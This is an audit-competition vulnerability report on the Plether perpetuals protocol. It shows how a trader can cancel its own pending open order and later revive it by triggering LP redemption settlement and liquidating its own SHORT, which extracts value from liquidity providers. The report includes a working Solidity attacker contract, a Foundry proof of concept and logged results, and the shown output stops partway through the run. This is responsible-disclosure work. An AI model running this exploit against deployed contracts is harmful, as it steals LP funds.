# \#97858 [SC-Critical] Owner-controlled solvency check in OrderRouter.executeOrder lets a trader void and revive its own pending open, leading to direct theft of user funds from LPs

**Submitted on Nov 3rd 2026 at 16:15:03 UTC by @deltabear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #97858
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

An open order's fill price is pinned to the first Pyth update after its commit, and anyone, its owner included, can execute it later. Execution checks the open against pool cash at that moment, and an open that no longer fits the solvency line fails as `PlannerRejected`, a terminal failure that refunds it. The order's owner moves that pool cash both ways after the commit with two permissionless calls. `Router.settleLpEpoch` pays out its own matured Junior redemption and lowers it. `Router.executeLiquidation` on its own thin SHORT moves that position's loss into the pool and raises it. So the attacker commits an open at the solvency line and, in the same transaction, pays out a 1,000 USDG redemption. From then on every execution of the order fails and refunds it, so a keeper that executes first can only cancel it. When the price moves the attacker's way, one transaction liquidates its SHORT and executes the open at the old price. This is component 3 of the pre-audit finding SC-M4, marked fixed, through a path the fix left open. In the run below, six hourly rounds of 30 bps moves end with the attacker 11,505.69 USDG richer in its own wallets after it withdraws everything, and the victim LP's Junior is worth 15,454.39 USDG less than with no trading. All four keeper executions of an armed open refunded it for 0.20 USDG, two of them before the attacker had seen any move. The same six orders without the arm lose 20,529.21 USDG.

## Vulnerability Details

A trader commits an open through `Router.commitOrder` (`OrderRouter.sol:85-89`). Its fill is priced from the first Pyth update after the commit: the oracle parses the update with `minPublishTime = request.commitTime + 1` through `parsePriceFeedUpdatesUnique` (`PletherOracle.sol:610-614`), and an update at or before the commit leaves the order pending (`OrderRouterExecutionSidecar.sol:450-452`). `Router.executeOrder` has no caller restriction (`OrderRouter.sol:240-243`).

Execution re-plans the open against pool state at that moment. The planner builds the solvency state from `snap.poolCashAssets`, the larger side's maximum profit and trader claims (`CfdEnginePlanLib.sol:754-758`) and requires the settlement buffer after the open (`CfdEnginePlanLib.sol:770-772`, `SolvencyAccountingLib.sol:93-101`). An open that misses it returns `SOLVENCY_EXCEEDED` (`CfdEnginePlanLib.sol:421-424`). That code maps to `ProtocolStateInvalidated` (`CfdEnginePlanLib.sol:119-126`), and the Router records the failure as terminal `PlannerRejected` (`OrderRouterExecutionSidecar.sol:849-853`). The margin reservation is released (`MarginClearinghouse.sol:663-673`). The bounty goes back to the order's own account on self-execution (`OrderRouter.sol:336-337`); a keeper that executes it is paid the bounty, at most 0.20 USDG.

The owner moves pool cash down and up after its commit:
- Down. `Router.settleLpEpoch` has no caller restriction (`OrderRouter.sol:479-484`). It funds each matured redemption and transfers the assets out of the pool (`HousePool.sol:1007-1008`). In the run, the attacker's own 1,000 USDG Junior lot is the redemption.
- Up. `Router.executeLiquidation` has no caller restriction either (`OrderRouter.sol:493-500`). Liquidating the attacker's own thin 400,000 USDG SHORT after a 30 bps move moves 1,004.863629 USDG of its loss into pool cash in round 2.

The attacker sizes the open at the solvency line: 3,791,000.00 USDG notional, with other traders holding a hedged book of 6,200,000 USDG a side, so the line binds below the 4,004,032.63 USDG skew cap. One transaction commits the open and settles the epoch, so from its first block the open fails for any executor. When the attacker sees a favorable move, one transaction liquidates the SHORT and executes the open with its pinned update, and the open fills at the old price. When the move is adverse, or a keeper gets there first, the execution refunds the order.

SECURITY.md states the guarantee this breaks: "binding order semantics and the lack of a user cancellation path prevent traders from turning queued intents into free options" (`SECURITY.md:658-659`). The pre-audit's SC-M4 component 3 is the same lever, "the attacker can trigger a full margin refund on the losing order by manipulating the vault depth", and its response is "Fixed in Plether-Fi/plether-core#24." (`audits/plether-pre-audit-report.pdf`, SC-M4). At a82d4fef LP deposits and redemptions move only at epoch settlement, but the owner still decides at execution time whether its own order passes. The guard that should have stopped this is an execution rule under which a state change the owner causes after its commit cannot void or revive the order. There is none.

### Vulnerable source code

**1. The fill is pinned to the first update after the commit** @ packages/perps/src/PletherOracle.sol:610-614
```solidity
        uint64 minPublishTime = request.commitTime + 1;
        uint256 settlementDeadline = uint256(request.commitTime) + orderSettlementWindow;
        uint64 maxPublishTime = uint64(settlementDeadline < block.timestamp ? settlementDeadline : block.timestamp);
        try pyth.parsePriceFeedUpdatesUnique{value: pythFee}(
            pythUpdateData, pythFeedIds, minPublishTime, maxPublishTime
```

**2. Anyone executes an order** @ packages/perps/src/OrderRouter.sol:240-243
```solidity
    function executeOrder(
        uint64 orderId,
        bytes[] calldata pythUpdateData
    ) external payable nonReentrant returns (OrderV3Types.ExecutionResult memory result) {
```

**3. Execution checks the open against pool cash at that moment** @ packages/perps/src/libraries/CfdEnginePlanLib.sol:754-758
```solidity
        SolvencyAccountingLib.SolvencyState memory currentState = SolvencyAccountingLib.buildSolvencyState(
            snap.poolCashAssets,
            SolvencyAccountingLib.getMaxLiability(snap.longSide.maxProfitAssets, snap.shortSide.maxProfitAssets),
            snap.totalTraderClaimBalanceAssets
```

**4. Missing the line is SOLVENCY_EXCEEDED** @ packages/perps/src/libraries/CfdEnginePlanLib.sol:421-424
```solidity
        if (!_applyOpenSettlementBufferAfterPlan(effectiveSnap, delta)) {
            delta.revertCode = CfdEnginePlanTypes.OpenRevertCode.SOLVENCY_EXCEEDED;
            return delta;
        }
```

**5. That is a protocol-state failure** @ packages/perps/src/libraries/CfdEnginePlanLib.sol:119-126
```solidity
        if (
            code == CfdEnginePlanTypes.OpenRevertCode.DEGRADED_MODE
                || code == CfdEnginePlanTypes.OpenRevertCode.SKEW_TOO_HIGH
                || code == CfdEnginePlanTypes.OpenRevertCode.SOLVENCY_EXCEEDED
                || code == CfdEnginePlanTypes.OpenRevertCode.NUMERIC_DOMAIN_EXCEEDED
        ) {
            return CfdEnginePlanTypes.ExecutionFailurePolicyCategory.ProtocolStateInvalidated;
        }
```

**6. The Router makes it terminal** @ packages/perps/src/OrderRouterExecutionSidecar.sol:849-853
```solidity
            ) {
                classification.terminal = true;
                classification.plannerFailure = true;
                classification.plannerIsClose = isClose == 1;
                classification.reason = OrderV3Types.TerminalReason.PlannerRejected;
```

**7. Down: anyone settles the LP epoch** @ packages/perps/src/OrderRouter.sol:479-484
```solidity
    function settleLpEpoch(
        bytes[] calldata pythUpdateData
    ) external payable nonReentrant {
        pythUpdateData;
        _delegateToKeeperSidecar();
    }
```

**8. A funded redemption leaves the pool** @ packages/perps/src/HousePool.sol:1007-1008
```solidity
            settlementToken.safeTransfer(vaultAddress, fundedAssets);
            vault.fundRedeemEpoch(epochId, fundedShares, fundedAssets);
```

**9. Up: anyone liquidates a position** @ packages/perps/src/OrderRouter.sol:493-500
```solidity
    function executeLiquidation(
        address account,
        bytes[] calldata pythUpdateData
    ) external payable nonReentrant {
        account;
        pythUpdateData;
        _delegateToKeeperSidecar();
    }
```

**10. The bounty returns to the owner on self-execution** @ packages/perps/src/OrderRouter.sol:336-337
```solidity
            if (bountyRecipient == order.account) {
                clearinghouse.releaseReservedExecutionBountyToSource(order.account, bountyAssets);
```

## Impact Details

- Impact row: "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield" (Critical). After six rounds the attacker withdraws all its margin, closes and withdraws its SHORT account, and redeems all its Junior. Its three wallets hold 331,505.692691 USDG against 320,000.000000 USDG at the start, +11,505.692691 USDG. Victim LP_J's Junior is worth 9,985,165.261182 USDG against 10,000,619.650908 USDG over the same hours with no trading, -15,454.389726 USDG, and -26,870.930659 USDG against the same orders traded without the arm.
- As per rules, the attack is profitable and repeatable hence its valid. There's current ambiguity towards the maximum damage an attacker can cause since it dependes on alot of things.
- A keeper cannot make the attacker lose on the open. Every keeper execution of an armed open refunded it, four of four, two of them at commit + 1 s, before the attacker had seen any move. The worst order P&L in the four rounds the attacker did not exercise is -0.200000 USDG, the bounty.
- The exercised rounds pay +8,116.261759 and +8,095.049696 USDG. The attacker's SHORT, liquidated in rounds 2 and 5 by the attacker and in round 4 by a keeper, costs -4,694.747262 USDG over the run, and its size is set by the switch lot, not by the open.
- The same six orders without the arm, each filled by a keeper at commit + 1 s, lose -20,529.206430 USDG.
- It repeats every hour. The switch is the attacker's own 1,000 USDG Junior lot, requested before each hour's cutoff and paid back at full value when the arm settles it.
- Prerequisites, all permissionless: 300,000 USDG of trading margin in a contract account that bundles the calls, 10,000 USDG of Junior bought through the public deposit queue, 10,000 USDG for the SHORT account, and a pool whose open interest puts the solvency line below the skew cap. The PoC prices both feeds with a 2 bps Pyth confidence, so every fill carries the release adverse-confidence shift.
- Every LP pays pro rata through the pool's trading P&L.
- Dedup note. SC-M4 is marked fixed. The program's rule is "For findings marked as fixed or Acknowledged in the reports above, a report on the same root cause is valid only if it shows that the fix at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8 is incomplete or introduces a new bug." The run is at that commit. The known issue HIGH-1 (commit after an already published price) has a different root: here the order is committed before its tick, and the lever is the owner's control of its own order's outcome. The PoC also meets the HIGH-1 bar, "a proof of concept showing a repeatable, net-profitable extraction from LPs".

## References

Order pricing and execution
- packages/perps/src/OrderRouter.sol:85-89 - `commitOrder`
- packages/perps/src/PletherOracle.sol:610-614 - fill pinned to the first update after `commitTime`
- packages/perps/src/OrderRouterExecutionSidecar.sol:450-452 - an update at or before the commit stays pending
- packages/perps/src/OrderRouter.sol:240-243 - `executeOrder`, any caller

Solvency failure
- packages/perps/src/libraries/CfdEnginePlanLib.sol:754-758 - solvency state from pool cash, max liability, claims
- packages/perps/src/libraries/CfdEnginePlanLib.sol:770-772 - settlement buffer required after the open
- packages/perps/src/libraries/SolvencyAccountingLib.sol:93-101 - `hasRequiredSettlementBuffer`
- packages/perps/src/libraries/CfdEnginePlanLib.sol:421-424 - `SOLVENCY_EXCEEDED`
- packages/perps/src/libraries/CfdEnginePlanLib.sol:119-126 - `ProtocolStateInvalidated`
- packages/perps/src/OrderRouterExecutionSidecar.sol:849-853 - terminal `PlannerRejected`
- packages/perps/src/MarginClearinghouse.sol:663-673 - margin reservation released
- packages/perps/src/OrderRouter.sol:336-337 - bounty back to the owner

The two levers
- packages/perps/src/OrderRouter.sol:479-484 - `settleLpEpoch`, any caller
- packages/perps/src/HousePool.sol:1007-1008 - funded redemption transferred out of the pool
- packages/perps/src/OrderRouter.sol:493-500 - `executeLiquidation`, any caller

Guarantee and prior finding
- packages/perps/SECURITY.md:658-659 - "lack of a user cancellation path"
- audits/plether-pre-audit-report.pdf, SC-M4 - component 3, "Fixed in Plether-Fi/plether-core#24."

## Link to Proof of Concept

https://gist.github.com/decies-centena-millia/8c6e52b099c2fa098ee5c266f5e7b59c

## Proof of Concept

## Proof of Concept

One test, three runs of the same six hours from one snapshot: the attack, an honest control in which a keeper fills every order at commit + 1 s, and a baseline with no orders. In rounds 3 and 4 a keeper executes the armed open at commit + 1 s, before any move. Each run ends with the attacker withdrawing everything to its wallets. It runs in the repo's Foundry suite at a82d4fef on the repo's own `BasePerpTest` with the `DEPLOYMENT.md` release parameters; only USDG and Pyth are the repo's mocks. Files: https://gist.github.com/decies-centena-millia/8c6e52b099c2fa098ee5c266f5e7b59c

```bash
mkdir -p packages/perps/test/poc && cp LpSettlementCancelsOwnOpenPoC.t.sol packages/perps/test/poc/ && cd packages/perps && forge test --match-path test/poc/LpSettlementCancelsOwnOpenPoC.t.sol -vv
```

### attack step-by-step

1. Monday 2024-10-14 10:00 UTC: victim LP_J deposits 10,000,000 USDG of Junior, and other traders hold a hedged book of 6,200,000 USDG long and short. ATTACKER deploys `OptionAccount` and funds it with 300,000 USDG of margin; ATTACKER_B buys 10,000 USDG of Junior through the public deposit queue; HEDGE deposits 10,000 USDG.
2. Each hour, 20 minutes before the boundary, HEDGE opens a 400,000 USDG SHORT at its minimum margin if it has none. It is healthy at 1.00 and liquidatable after a 30 bps fall. Ten minutes before the boundary ATTACKER_B requests redemption of a 1,000 USDG lot.
3. At hour + 3 s, `OptionAccount.commitAndArm` commits a LONG open at the solvency line (3,791,000.00 USDG notional in round 1) and calls `Router.settleLpEpoch` in the same transaction, which pays out ATTACKER_B's lot. Any execution of the open now fails.
4. Rounds 3 and 4: a keeper calls `Router.executeOrder` at commit + 1 s: `PlannerRejected`, refunded. Rounds 1 and 6 (adverse): the attacker does nothing, and the keeper's execution at commit + 3 s refunds it.
5. Rounds 2 and 5 (favorable, seen at commit + 3 s): `OptionAccount.exercise` calls `Router.executeLiquidation` on HEDGE at the moved price and `Router.executeOrder` with the pinned update in one transaction. The open fills at 1.00; a close then fills at the moved price.
6. After round 6, ATTACKER withdraws the account's whole balance, HEDGE closes and withdraws, and ATTACKER_B redeems its remaining Junior.

## main Attack code

```solidity
// one transaction at commit: from here every execution of the open fails SOLVENCY_EXCEEDED and refunds it
function commitAndArm(OrderV3Types.OrderRequest calldata request, bytes[] calldata live) external onlyOwner returns (uint64 orderId) {
    orderId = router.commitOrder(request);
    router.settleLpEpoch(live);                       // pays out ATTACKER_B's matured 1,000 USDG lot
}

// one transaction after a favorable move: the SHORT's loss refills pool cash, then the open fills at its pinned tick
function exercise(address hedge, bytes[] calldata live, uint64 orderId, bytes[] calldata pinned) external onlyOwner returns (OrderV3Types.ExecutionResult memory result) {
    router.executeLiquidation(hedge, live);
    result = router.executeOrder(orderId, pinned);
}
```

```
plant : an open committed at the solvency line, armed in the same transaction by settling the attacker's own matured Junior lot
fire  : Router.executeLiquidation of the attacker's own SHORT and Router.executeOrder in one transaction, after a favorable move
```

### full poc code, single file, single runnable command

The whole file is [`LpSettlementCancelsOwnOpenPoC.t.sol`](https://gist.github.com/decies-centena-millia/8c6e52b099c2fa098ee5c266f5e7b59c#file-lpsettlementcancelsownopenpoc-t-sol) in the gist, 755 lines: a `PocBase` fixture over the repo's `packages/perps/test/perps/BasePerpTest.sol` with the release parameters, the attacker's `OptionAccount`, then `LpSettlementCancelsOwnOpenPoC`. The run's complete `-vv` output is [`output.log`](https://gist.github.com/decies-centena-millia/8c6e52b099c2fa098ee5c266f5e7b59c#file-output-log). Command, from the repo root at a82d4fef:

```bash
mkdir -p packages/perps/test/poc && cp LpSettlementCancelsOwnOpenPoC.t.sol packages/perps/test/poc/ && cd packages/perps && forge test --match-path test/poc/LpSettlementCancelsOwnOpenPoC.t.sol -vv
```

The attacker's account, the round and the test, verbatim from that file:

```solidity
interface IPocRouter {
    function commitOrder(OrderV3Types.OrderRequest calldata request) external returns (uint64 orderId);
    function executeOrder(uint64 orderId, bytes[] calldata pythUpdateData)
        external
        payable
        returns (OrderV3Types.ExecutionResult memory result);
    function settleLpEpoch(bytes[] calldata pythUpdateData) external payable;
    function executeLiquidation(address account, bytes[] calldata pythUpdateData) external payable;
}

interface IPocClearinghouse {
    function depositMargin(uint256 amount) external;
    function withdrawMargin(uint256 amount) external;
    function balanceAssets(address account) external view returns (uint256);
}

// The attacker's trading account. One transaction commits the open and arms it; one transaction exercises it.
contract OptionAccount {
    address internal immutable owner;
    IPocRouter internal immutable router;
    IPocClearinghouse internal immutable clearinghouse;
    IERC20 internal immutable usdg;

    constructor(address router_, address clearinghouse_, address usdg_) {
        owner = msg.sender;
        router = IPocRouter(router_);
        clearinghouse = IPocClearinghouse(clearinghouse_);
        usdg = IERC20(usdg_);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "owner");
        _;
    }

    function fund(uint256 amount) external onlyOwner {
        usdg.transferFrom(owner, address(this), amount);
        usdg.approve(address(clearinghouse), amount);
        clearinghouse.depositMargin(amount);
    }

    // Commit the open, then pay out a matured LP redemption in the same transaction: from here on the open fails
    // SOLVENCY_EXCEEDED for every executor, and a failure refunds it.
    function commitAndArm(OrderV3Types.OrderRequest calldata request, bytes[] calldata live)
        external
        onlyOwner
        returns (uint64 orderId)
    {
        orderId = router.commitOrder(request);
        router.settleLpEpoch(live);
    }

    function commit(OrderV3Types.OrderRequest calldata request) external onlyOwner returns (uint64 orderId) {
        orderId = router.commitOrder(request);
    }

    // Liquidate the attacker's own thin SHORT, whose loss refills pool cash, then execute the open at its pinned tick.
    function exercise(address hedge, bytes[] calldata live, uint64 orderId, bytes[] calldata pinned)
        external
        onlyOwner
        returns (OrderV3Types.ExecutionResult memory result)
    {
        router.executeLiquidation(hedge, live);
        result = router.executeOrder(orderId, pinned);
    }

    function withdrawAll() external onlyOwner {
        uint256 balance = clearinghouse.balanceAssets(address(this));
        clearinghouse.withdrawMargin(balance);
        usdg.transfer(owner, balance);
    }
}

contract LpSettlementCancelsOwnOpenPoC is PocBase {
    uint256 internal constant DEPTH = 10_000_000e6;
    uint256 internal constant BOOK_STEP = 1_550_000e6; // four steps a side: 6,200,000 USDG long and short
    uint256 internal constant SWITCH_LOT = 1_000e6;
    uint256 internal constant SWITCH_FUND = 10_000e6;
    uint256 internal constant HEDGE_NOTIONAL = 400_000e6;
    uint256 internal constant HEDGE_FUND = 10_000e6;
    uint256 internal constant MARGIN = 100_000e6;
    uint256 internal constant TRADING = 300_000e6;
    uint256 internal constant MOVE_BP = 30;
    uint256 internal constant ROUNDS = 6;
    uint64 internal constant CONF = 2e4; // 2 bps of the 1.00 price on each feed

    address internal constant HEDGE = address(0xC5); // the attacker's thin SHORT
    address internal constant BOOK_LONG = address(0x4A1);
    address internal constant BOOK_SHORT = address(0x4A2);

    enum Mode {
        Attack,
        Honest,
        NoTrading
    }

    struct Outcome {
        uint256 attackerWallets;
        uint256 victimValue;
        int256[ROUNDS] orderPnl;
        int256 hedgePnl;
        uint256 keeperRefunds;
    }

    OptionAccount internal acct;
    uint256 private nonce;

    // Router.executeOrder by `executor`, with the order's own pinned tick (commit + 1) at `price`.
    function _execAt(address executor, uint64 id, uint256 price) internal returns (OrderV3Types.ExecutionResult memory r) {
        bytes[] memory d = _tick(price, _commitTime(id) + 1);
        vm.prank(executor);
        r = router.executeOrder(id, d);
    }

    // An EOA's order: commit, then a keeper executes it one second later at the pinned tick.
    function _orderNow(address account, CfdTypes.Side side, uint256 size, uint256 margin, bool isClose, uint256 price)
        internal
        returns (bool filled)
    {
        OrderV3Types.OrderRequest memory req = _request(side, size, margin, isClose);
        vm.prank(account);
        (bool ok, bytes memory ret) = address(router).call(abi.encodeCall(IPocRouter.commitOrder, (req)));
        if (!ok) return false;
        _advance(1);
        filled = _executed(_execAt(KEEPER, abi.decode(ret, (uint64)), price));
    }

    // Does an open of `notional` from the attacker's account commit and fill right now?
    function _fits(uint256 notional) internal returns (bool filled) {
        uint256 s = vm.snapshotState();
        filled = _orderNow(address(acct), CfdTypes.Side.LONG, _sizeFor(notional, PX), MARGIN, false, PX);
        vm.revertToState(s);
    }

    function _maxOpen() internal returns (uint256 lo) {
        uint256 hi = (_effectiveAssets() * 4) / 10;
        while (hi - lo > 10e6) {
            uint256 mid = (lo + hi) / 2;
            if (_fits(mid)) lo = mid;
            else hi = mid;
        }
    }

    // One hour. `favorable` is the move after the pinned tick; `keeperFirst` puts a keeper's execution at commit + 1 s,
    // before the attacker has seen any move. Otherwise the attacker acts at commit + 3 s.
    function _round(uint256 k, bool favorable, bool keeperFirst, Mode mode) internal returns (int256 pnl, bool refunded) {
        _warpTo(((_now() / 1 hours) + 1) * 1 hours - 20 minutes);
        _live(PX);
        if (mode == Mode.Attack && _sizeOf(HEDGE) == 0) _openHedge();
        _warpTo(((_now() / 1 hours) + 1) * 1 hours - 10 minutes);
        uint256 shares = juniorVault.convertToShares(SWITCH_LOT);
        vm.prank(ATTACKER_B);
        uint256 rid = juniorVault.requestRedeem(shares, ATTACKER_B, ATTACKER_B);
        _warpTo(pool.lpEpochStart(rid) + 2);
        _live(PX);
        uint256 p1 = favorable ? PX - (PX * MOVE_BP) / 10_000 : PX + (PX * MOVE_BP) / 10_000;
        string memory what;

        if (mode == Mode.NoTrading) {
            _settleBy(KEEPER, PX);
            what = "no order";
        } else {
            uint256 skewCap = (_effectiveAssets() * 4) / 10;
            uint256 n = _maxOpen();
            uint256 size = _sizeFor(n, PX);
            require(!_fits(n + 10e6), "open sized at the solvency line");
            uint256 w0 = _accountBalance();
            _advance(1);
            OrderV3Types.OrderRequest memory req = _request(CfdTypes.Side.LONG, size, MARGIN, false);
            uint64 id;
            if (mode == Mode.Attack) {
                bytes[] memory live = _tick(PX, _now());
                vm.prank(ATTACKER);
                id = acct.commitAndArm(req, live);
            } else {
                vm.prank(ATTACKER);
                id = acct.commit(req);
            }
            _advance(1); // commit + 1 s: the pinned tick exists
            OrderV3Types.ExecutionResult memory r;
            if (mode == Mode.Honest) {
                r = _execAt(KEEPER, id, PX);
                require(_executed(r), "honest: keeper fills at the pinned tick");
                _advance(2);
                OrderV3Types.OrderRequest memory closeReq = _request(CfdTypes.Side.LONG, _sizeOf(address(acct)), 0, true);
                vm.prank(ATTACKER);
                uint64 closeId = acct.commit(closeReq);
                _advance(1);
                require(_executed(_execAt(KEEPER, closeId, p1)), "close did not fill");
                what = "keeper fills at the pinned tick at commit + 1 s, trader closes at the moved price";
            } else if (keeperFirst) {
                r = _execAt(KEEPER, id, PX);
                assertEq(uint256(r.terminalReason), uint256(OrderV3Types.TerminalReason.PlannerRejected), "keeper first: refunded");
                refunded = true;
                _advance(2);
                if (favorable && _liquidatable(HEDGE, p1)) {
                    bytes[] memory d = _tick(p1, _now());
                    vm.prank(KEEPER);
                    router.executeLiquidation(HEDGE, d);
                }
                what = favorable
                    ? "KEEPER executes first at commit + 1 s: PlannerRejected, refunded; the move then lets a keeper liquidate HEDGE"
                    : "KEEPER executes first at commit + 1 s: PlannerRejected, refunded";
            } else {
                _advance(2); // commit + 3 s: the attacker has seen the move
                if (favorable) {
                    bytes[] memory live = _tick(p1, _now());
                    bytes[] memory pinned = _tick(PX, _commitTime(id) + 1);
                    uint256 sx = vm.snapshotState();
                    uint256 e0 = _effectiveAssets();
                    vm.prank(KEEPER);
                    router.executeLiquidation(HEDGE, live);
                    uint256 refill = _effectiveAssets() - e0;
                    vm.revertToState(sx);
                    vm.prank(ATTACKER);
                    r = acct.exercise(HEDGE, live, id, pinned);
                    require(_executed(r), "exercise: the open fills at the pinned tick");
                    _advance(1);
                    OrderV3Types.OrderRequest memory closeReq = _request(CfdTypes.Side.LONG, _sizeOf(address(acct)), 0, true);
                    vm.prank(ATTACKER);
                    uint64 closeId = acct.commit(closeReq);
                    _advance(1);
                    require(_executed(_execAt(KEEPER, closeId, p1)), "close did not fill");
                    what = string.concat(
                        "attacker liquidates HEDGE (adds ", _usd(refill), " USDG of pool cash) and executes in one transaction: fills at the pinned tick, closes at the moved price"
                    );
                } else {
                    r = _execAt(KEEPER, id, PX);
                    assertEq(uint256(r.terminalReason), uint256(OrderV3Types.TerminalReason.PlannerRejected), "adverse: refunded");
                    refunded = true;
                    what = "attacker does nothing; the keeper's execution at commit + 3 s fails PlannerRejected, refunded";
                }
            }
            if (juniorVault.claimableRedeemRequest(rid, ATTACKER_B) == 0) _settleBy(KEEPER, p1);
            pnl = int256(_accountBalance()) - int256(w0);
            if (k == 0) {
                console2.log(
                    string.concat(
                        "   open: LONG ", _usd((size * PX) / 1e20), " USDG notional, the largest that fits under the solvency line (skew cap ", _usd(skewCap), "); switch lot ", _usd(SWITCH_LOT)
                    )
                );
            }
        }
        _claimRedeemAll(juniorVault, ATTACKER_B, rid);
        console2.log(
            string.concat(
                "   round ",
                vm.toString(k + 1),
                favorable ? " (favorable 30 bps): " : " (adverse 30 bps): ",
                what,
                "; order P&L ",
                _usdSigned(pnl)
            )
        );
    }

    function _run(Mode mode) internal returns (Outcome memory o) {
        console2.log(
            mode == Mode.Attack
                ? "-- ATTACK: arm every open at commit, exercise only favorable moves the attacker sees first"
                : (mode == Mode.Honest ? "-- CONTROL: same orders, no arm, a keeper fills each at commit + 1 s" : "-- BASELINE: no orders")
        );
        bool[ROUNDS] memory favorable = [false, true, false, true, true, false];
        bool[ROUNDS] memory keeperFirst = [false, false, true, true, false, false];
        uint256 hedge0 = clearinghouse.balanceAssets(HEDGE);
        for (uint256 k; k < ROUNDS; ++k) {
            bool refunded;
            (o.orderPnl[k], refunded) = _round(k, favorable[k], keeperFirst[k], mode);
            if (refunded) ++o.keeperRefunds;
        }
        _warpTo(((_now() / 1 hours) + 1) * 1 hours - 20 minutes);
        _live(PX);
        if (_sizeOf(HEDGE) > 0) {
            require(_orderNow(HEDGE, CfdTypes.Side.SHORT, _sizeOf(HEDGE), 0, true, PX), "hedge close");
        }
        o.hedgePnl = int256(clearinghouse.balanceAssets(HEDGE)) - int256(hedge0);
        uint256 hedgeBalance = clearinghouse.balanceAssets(HEDGE);
        vm.prank(HEDGE);
        clearinghouse.withdrawMargin(hedgeBalance);
        vm.prank(ATTACKER);
        acct.withdrawAll();

        _warpTo(((_now() / 1 hours) + 1) * 1 hours - 10 minutes);
        (uint256 rid,) = _requestRedeemAll(juniorVault, ATTACKER_B);
        _warpTo(pool.lpEpochStart(rid) + 2);
        _settleBy(KEEPER, PX);
        _claimRedeemAll(juniorVault, ATTACKER_B, rid);
        o.attackerWallets = _attackerWallets();
        o.victimValue = juniorVault.convertToAssets(juniorVault.balanceOf(LP_J));
        console2.log(
            string.concat(
                "   attacker wallets after withdrawing everything: ", _usd(o.attackerWallets), "; victim LP_J Junior value: ", _usd(o.victimValue)
            )
        );
    }

    function test_armedOpenIsKeeperProof_attackerWithdrawsLpFundsToWallet() public {
        _setup();
        uint256 start = TRADING + SWITCH_FUND + HEDGE_FUND;
        console2.log(
            string.concat(
                "setup: victim LP_J Junior ", _usd(juniorVault.convertToAssets(juniorVault.balanceOf(LP_J))), " USDG; other traders' hedged book 6200000.000000 USDG a side"
            )
        );
        console2.log(string.concat("setup: attacker wallets started with ", _usd(start), " USDG; Pyth confidence 2 bps"));
        uint256 snap = vm.snapshotState();

        Outcome memory a = _run(Mode.Attack);
        vm.revertToState(snap);
        snap = vm.snapshotState();
        Outcome memory h = _run(Mode.Honest);
        vm.revertToState(snap);
        Outcome memory b = _run(Mode.NoTrading);

        int256 attackerNet = int256(a.attackerWallets) - int256(start);
        int256 honestNet = int256(h.attackerWallets) - int256(start);
        int256 victimVsBaseline = int256(a.victimValue) - int256(b.victimValue);
        int256 victimVsHonest = int256(a.victimValue) - int256(h.victimValue);
        int256 worstUnexercised;
        for (uint256 k; k < ROUNDS; ++k) {
            bool exercised = k == 1 || k == 4;
            if (!exercised && a.orderPnl[k] < worstUnexercised) worstUnexercised = a.orderPnl[k];
        }
        assertApproxEqAbs(b.attackerWallets, start, 10, "baseline: the attacker's capital comes back unchanged");
        assertEq(a.keeperRefunds, 4, "every keeper execution of an armed open refunds it");
        assertGe(worstUnexercised, -int256(router.maxOpenOrderExecutionBountyAssets()), "an armed open never fills at a loss");
        assertLt(h.orderPnl[0], 0, "control: the same adverse open loses");
        assertGt(attackerNet, 0, "attacker ends with more USDG in its wallets");
        assertLt(honestNet, 0, "the same orders without the arm lose");
        assertLt(victimVsBaseline, 0, "the victim LP's Junior is worth less");

        console2.log("");
        _row("account", "before", "after", "delta");
        _row("ATTACKER wallets (3)", _usd(start), _usd(a.attackerWallets), _usdSigned(attackerNet));
        _row("VICTIM LP_J Junior value", _usd(b.victimValue), _usd(a.victimValue), _usdSigned(victimVsBaseline));
        console2.log("    (VICTIM before = its Junior value in the no-trading baseline over the same hours)");
        console2.log("");
        console2.log("IMPACT row: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield (Critical)");
        console2.log(string.concat("IMPACT attacker net, withdrawn to its own wallets after 6 rounds: ", _usdSigned(attackerNet), " USDG"));
        console2.log(
            string.concat(
                "IMPACT victim LP_J Junior value vs the no-trading baseline: ", _usdSigned(victimVsBaseline), " USDG; vs the honest control: ", _usdSigned(victimVsHonest), " USDG"
            )
        );
        console2.log(
            string.concat(
                "IMPACT keeper race: 4 of 4 keeper executions of an armed open refunded it, 2 of them before the attacker saw any move; worst unexercised order P&L ",
                _usdSigned(worstUnexercised),
                " USDG"
            )
        );
        console2.log(
            string.concat(
                "IMPACT exercised rounds 2 and 5: ", _usdSigned(a.orderPnl[1]), " and ", _usdSigned(a.orderPnl[4]), " USDG; the hedge SHORT cost ", _usdSigned(a.hedgePnl), " USDG over the run"
            )
        );
        console2.log(string.concat("IMPACT the same 6 orders without the arm, keeper filling at commit + 1 s: ", _usdSigned(honestNet), " USDG"));
    }

    // _tick, _request, _commitTime, _live, _settleBy, _hedgeMinMargin, _liquidatable, _setup, _openHedge and the wealth views are in the gist file
}
```

### Output

```
Ran 1 test for test/poc/LpSettlementCancelsOwnOpenPoC.t.sol:LpSettlementCancelsOwnOpenPoC
[PASS] test_armedOpenIsKeeperProof_attackerWithdrawsLpFundsToWallet() (gas: 703855195)
Logs:
  setup: victim LP_J Junior 10000619.650965 USDG; other traders' hedged book 6200000.000000 USDG a side
  setup: attacker wallets started with 320000.000000 USDG; Pyth confidence 2 bps
  -- ATTACK: arm every open at commit, exercise only favorable moves the attacker sees first
     open: LONG 3791000.000000 USDG notional, the largest that fits under the solvency line (skew cap 4004032.631640); switch lot 1000.000000
     round 1 (adverse 30 bps): attacker does nothing; the keeper's execution at commit + 3 s fails PlannerRejected, refunded; order P&L -0.200000
     round 2 (favorable 30 bps): attacker liquidates HEDGE (adds 1004.863629 USDG of pool cash) and executes in one transaction: fills at the pinned tick, closes at the moved price; order P&L +8116.261759
     round 3 (adverse 30 bps): KEEPER executes first at commit + 1 s: PlannerRejected, refunded; order P&L -0.200000
     round 4 (favorable 30 bps): KEEPER executes first at commit + 1 s: PlannerRejected, refunded; the move then lets a keeper liquidate HEDGE; order P&L -0.200000
     round 5 (favorable 30 bps): attacker liquidates HEDGE (adds 1004.773599 USDG of pool cash) and executes in one transaction: fills at the pinned tick, closes at the moved price; order P&L +8095.049696
